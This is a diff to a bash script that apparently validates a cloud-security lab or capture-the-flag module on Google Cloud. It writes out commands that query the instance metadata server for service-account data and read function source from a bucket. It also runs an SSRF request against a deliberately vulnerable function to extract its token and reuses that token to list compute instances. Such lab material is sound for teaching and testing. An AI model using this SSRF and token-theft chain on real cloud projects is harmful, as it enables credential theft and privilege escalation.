@@ -128,7 +128,7 @@ fi
 print_step "Testing metadata server access..."
 
 print_info "Querying metadata server for service account information..."
-METADATA_OUTPUT=$(exec_on_vm "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/'" || true)
+METADATA_OUTPUT=$(exec_on_vm "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/'")
 
 if echo "$METADATA_OUTPUT" | grep -q "aliases\|email\|scopes"; then
     print_pass "VM can access metadata server"
@@ -139,7 +139,7 @@ else
 fi
 
 # Test email endpoint specifically
-EMAIL_OUTPUT=$(exec_on_vm "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email'" || true)
+EMAIL_OUTPUT=$(exec_on_vm "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email'")
 if [[ "$EMAIL_OUTPUT" =~ @developer\.gserviceaccount\.com ]]; then
     print_pass "Can retrieve service account email from metadata: $EMAIL_OUTPUT"
 else
@@ -150,7 +150,7 @@ fi
 print_step "Testing OAuth scope limitations..."
 
 print_info "Checking if VM can list compute instances (should fail)..."
-COMPUTE_OUTPUT=$(exec_on_vm "gcloud compute instances list 2>&1" || true)
+COMPUTE_OUTPUT=$(exec_on_vm "gcloud compute instances list 2>&1")
 
 if echo "$COMPUTE_OUTPUT" | grep -q "Request had insufficient authentication scopes\|insufficient OAuth scopes"; then
     print_pass "Compute API access correctly denied due to insufficient scopes"
@@ -201,7 +201,7 @@ fi
 # Step 7: Test storage access from VM
 print_step "Testing storage bucket access from VM..."
 
-BUCKET_OUTPUT=$(exec_on_vm "gsutil ls 2>/dev/null" || true)
+BUCKET_OUTPUT=$(exec_on_vm "gsutil ls 2>/dev/null")
 
 if echo "$BUCKET_OUTPUT" | grep -q "cloud-function-bucket-module3"; then
     print_pass "VM can list cloud function bucket"
@@ -214,7 +214,7 @@ fi
 # Step 8: Check function source access from VM
 print_step "Checking function source code access..."
 
-SOURCE_OUTPUT=$(exec_on_vm "gsutil ls gs://cloud-function-bucket-module3-$PROJECT_ID/ 2>/dev/null" || true)
+SOURCE_OUTPUT=$(exec_on_vm "gsutil ls gs://cloud-function-bucket-module3-$PROJECT_ID/ 2>/dev/null")
 
 if echo "$SOURCE_OUTPUT" | grep -q "main.py"; then
     print_pass "VM can access function source code (main.py)"
@@ -235,7 +235,7 @@ print_step "Reading and validating function source code..."
 
 if echo "$SOURCE_OUTPUT" | grep -q "main.py"; then
     print_info "Attempting to read main.py from bucket..."
-    SOURCE_CODE=$(exec_on_vm "gsutil cat gs://cloud-function-bucket-module3-$PROJECT_ID/main.py 2>/dev/null" || true)
+    SOURCE_CODE=$(exec_on_vm "gsutil cat gs://cloud-function-bucket-module3-$PROJECT_ID/main.py 2>/dev/null")
     
     if [ -n "$SOURCE_CODE" ]; then
         # Check for key vulnerable code patterns
@@ -279,7 +279,7 @@ if exec_on_vm "test -f ./invoke_monitoring_function.sh && echo 'exists'" | grep 
     
     # Test the script
     print_info "Testing invocation script execution..."
-    INVOKE_TEST=$(exec_on_vm "export LOCATION=$LOCATION PROJECT_ID=$PROJECT_ID && bash ./invoke_monitoring_function.sh 2>&1" || true)
+    INVOKE_TEST=$(exec_on_vm "export LOCATION=$LOCATION PROJECT_ID=$PROJECT_ID && bash ./invoke_monitoring_function.sh 2>&1")
     
     if echo "$INVOKE_TEST" | grep -q "function_account"; then
         print_pass "Invocation script successfully calls cloud function"
@@ -309,12 +309,7 @@ print_info "Using function URL: $FUNCTION_URL"
 # Execute the SSRF attack from VM
 # First get the identity token
 print_info "Getting identity token from VM..."
-ID_TOKEN=$(exec_on_vm "gcloud auth print-identity-token" || true)
-
-if [ -z "$ID_TOKEN" ]; then
-    print_fail "Failed to get identity token from VM"
-    exit 1
-fi
+ID_TOKEN=$(exec_on_vm "gcloud auth print-identity-token")
 
 # Then use it in the curl command
 SSRF_CMD="curl -s -X POST '$FUNCTION_URL' \
@@ -322,7 +317,7 @@ SSRF_CMD="curl -s -X POST '$FUNCTION_URL' \
 -H 'Content-Type: application/json' \
 -d '{\"metadata\": \"token\"}'"
 
-SSRF_RESPONSE=$(exec_on_vm "$SSRF_CMD" 2>/dev/null || true)
+SSRF_RESPONSE=$(exec_on_vm "$SSRF_CMD" 2>/dev/null)
 
 # Check for flag
 if echo "$SSRF_RESPONSE" | grep -q "flag4"; then
@@ -332,18 +327,18 @@ else
 fi
 
 # Check for token extraction
-if echo "$SSRF_RESPONSE" | grep -q "access_token"; then
+if echo "$SSRF_RESPONSE" | grep -q "function_account"; then
     print_pass "Access token exposed via SSRF vulnerability"
     print_info "Function's service account token is accessible"
     
     # Extract the token from the response
-    EXTRACTED_TOKEN=$(echo "$SSRF_RESPONSE" | grep -o '"access_token": "[^"]*"' | cut -d'"' -f4)
+    EXTRACTED_TOKEN=$(echo "$SSRF_RESPONSE" | grep -o '"function_account": "[^"]*"' | cut -d'"' -f4)
     
     if [ -n "$EXTRACTED_TOKEN" ]; then
         print_info "Validating extracted token's permissions..."
         
         # Check the extracted token's scopes
-        TOKEN_INFO=$(exec_on_vm "curl -s 'https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=$EXTRACTED_TOKEN' 2>/dev/null" || true)
+        TOKEN_INFO=$(exec_on_vm "curl -s 'https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=$EXTRACTED_TOKEN' 2>/dev/null")
         
         if echo "$TOKEN_INFO" | grep -q "cloud-platform"; then
             print_pass "Extracted token has cloud-platform scope (full GCP access)!"
@@ -355,7 +350,7 @@ if echo "$SSRF_RESPONSE" | grep -q "access_token"; then
             
             # Test that the new token can do things the VM token cannot
             print_info "Testing privilege escalation - attempting to list compute instances with function token..."
-            COMPUTE_TEST=$(exec_on_vm "export CLOUDSDK_AUTH_ACCESS_TOKEN='$EXTRACTED_TOKEN' && gcloud compute instances list --limit=1 2>&1" || true)
+            COMPUTE_TEST=$(exec_on_vm "export CLOUDSDK_AUTH_ACCESS_TOKEN='$EXTRACTED_TOKEN' && gcloud compute instances list --limit=1 2>&1")
             
             if echo "$COMPUTE_TEST" | grep -q "NAME\|ZONE\|MACHINE_TYPE"; then
                 print_pass "Function token can list compute instances (VM token cannot)!"
